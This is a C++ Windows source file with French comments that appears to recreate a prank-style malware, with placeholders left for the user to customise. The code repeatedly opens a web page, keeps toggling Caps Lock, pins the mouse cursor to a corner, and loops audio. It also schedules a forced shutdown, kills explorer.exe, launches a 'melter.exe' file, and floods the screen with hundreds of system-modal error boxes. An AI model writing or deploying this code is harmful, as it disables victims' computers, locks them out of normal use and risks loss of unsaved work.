#include "../header/main.h"
#include <Windows.h>
#include <sapi.h>
#include <mmsystem.h>
#include <thread>





             // Renvoyer l'utilisateur sur une page web de votre choix..
           // .. Le malware original renvoie au screamer cactus aujourd'hui obsolète (http://0xad.net/cactus)
void Cactus() {
    while(true) {
        ShellExecute(0, 0, "https://github.com/", 0, 0 , SW_HIDE);
        Sleep(2000);
    }
}



void msgbox() {
    MessageBoxW(
        0,
        L"Votre Message ",
        L"L'Élite de la Nation",
        MB_ICONERROR | MB_OK | MB_SYSTEMMODAL
        );
}


// Faire clignoter les touches de verrouillage
void CapsLock() {
    while(true) {
        keybd_event(VK_CAPITAL, 0x14, KEYEVENTF_EXTENDEDKEY, 0);
        Sleep(100);
        keybd_event(VK_CAPITAL, 0x14, KEYEVENTF_KEYUP, 0);
        Sleep(100);
    }
}


// La petite voix
void Sapi(LPCWSTR text) {
    CoInitialize(NULL);
    ISpVoice* pVoice = NULL;
    HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&pVoice);
    if (SUCCEEDED(hr)) {
        pVoice->Speak(text, 0, NULL);
        pVoice->Release();
    }
    CoUninitialize();
}


// La musique (Issou Night Club - Remi Flip & The Cadillac Theory - Stupeflip)
void Music() {
    PlaySoundA("issou.wav ", NULL, SND_FILENAME | SND_SYNC);
    while(true) {
        PlaySoundA("cadillac.wav ", NULL, SND_FILENAME | SND_SYNC);
    }
}


// Bloquer le curseur de la souris en haut à gauche de l'écran (le malware original inverse les clics de la souris)
void Mouse_Cursor() {
    while(true) {
        SetCursorPos(0, 0);
        Sleep(10);
    }
}

void Loop_MsgBox() {
    WinExec("shutdown /s /t 300 /c \"Votre Message\"", SW_HIDE);
    WinExec("taskkill /f /im explorer.exe", SW_HIDE);
    ShellExecute(0, "open", "cmd.exe", "melter.exe", 0, SW_HIDE);

    std::thread mouse(Mouse_Cursor);
    mouse.detach();

    // Cette boucle peut-être remplacée par un -> ' while(true); do, while() '
    for(int i = 0; i <= 500; i++) {
        std::thread msg(msgbox);
        msg.detach();
        Sleep(80);
    }
}